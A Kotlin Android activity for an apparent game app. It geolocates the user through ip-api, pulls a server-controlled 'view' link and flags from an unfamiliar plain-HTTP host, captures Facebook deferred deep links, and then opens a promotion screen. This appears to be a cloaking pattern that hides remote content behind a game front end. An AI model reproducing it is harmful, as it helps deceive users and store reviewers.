package com.rubygames.assass

import android.content.Context
import android.content.Intent
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity
import com.facebook.applinks.AppLinkData
import com.orhanobut.hawk.Hawk
import com.rubygames.assass.MainClass.Companion.countryCode
import com.rubygames.assass.MainClass.Companion.geo
import com.rubygames.assass.databinding.ActivityMainBinding
import kotlinx.coroutines.*
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit


class MainActivity : AppCompatActivity() {

    private lateinit var bindMainAct: ActivityMainBinding

    @OptIn(DelicateCoroutinesApi::class)
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        bindMainAct = ActivityMainBinding.inflate(layoutInflater)
        setContentView(bindMainAct.root)
        deePP(this)

        val executorService = Executors.newSingleThreadScheduledExecutor()
        var countCo: String? = Hawk.get(countryCode, null)
        var ge: String? = Hawk.get(geo, null)

        executorService.scheduleAtFixedRate({
            if (countCo != null && ge != null) {
                executorService.shutdown()
                intMain()
            } else {
                countCo = Hawk.get(countryCode)
                ge = Hawk.get(geo)
            }
        }, 0, 1, TimeUnit.SECONDS)

        GlobalScope.launch (Dispatchers.IO){
            jobMain
        }
    }

    private suspend fun getDataDev() {
        val retroBuildTwo = Retrofit.Builder()
            .addConverterFactory(GsonConverterFactory.create())
            .baseUrl("http://enigmaticaugustin.live/")
            .build()
            .create(ApiInter::class.java)

        val linkView = retroBuildTwo.getDataDev().body()?.view.toString()
        val appsChecker = retroBuildTwo.getDataDev().body()?.appsChecker.toString()
        val retroData = retroBuildTwo.getDataDev().body()?.geo.toString()

        Hawk.put(MainClass.link, linkView)
        Hawk.put(MainClass.appsCheck, appsChecker)
        Hawk.put(geo, retroData)
    }

    private suspend fun getData() {
    val retrofitBuilder = Retrofit.Builder()
            .addConverterFactory(GsonConverterFactory.create())
            .baseUrl("http://pro.ip-api.com/")
            .build()
            .create(ApiInter::class.java)

        val retData = retrofitBuilder.getData().body()?.countryCode
        Hawk.put(countryCode, retData)
    }

    @OptIn(DelicateCoroutinesApi::class)
    private val jobMain: Job = GlobalScope.launch (Dispatchers.IO){
        getData()
        getDataDev()
    }

    private fun intMain() {
        val intent = Intent(this@MainActivity, PromActivity::class.java)
        startActivity(intent)
        finish()
    }

    fun deePP(context: Context) {
        AppLinkData.fetchDeferredAppLinkData(context) { appLinkData: AppLinkData? ->
            appLinkData?.let {
                val params = appLinkData.targetUri.host.toString()
                Hawk.put(MainClass.DEEPL, params)
            }
            if (appLinkData == null) {
            }
        }
    }
}